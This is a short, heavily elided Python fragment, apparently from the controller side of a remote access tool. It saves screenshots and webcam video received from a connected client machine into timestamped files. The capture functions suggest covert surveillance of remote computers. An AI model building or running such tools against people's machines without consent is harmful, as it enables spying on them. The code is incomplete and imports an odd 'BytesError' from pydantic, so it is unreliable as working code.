...
from pydantic import BytesError
...
def CaptureScreenshot():
    ...
    try:
        ...
        with open(time.strftime(f"{client[0]}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
...
def CaptureWebcam():
    ...
    try:
        fileContent = recvAll_Verbose(recv(BUFFER))
        with open(time.strftime(f"{client[0]}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
            ImageFile.write(fileContent)
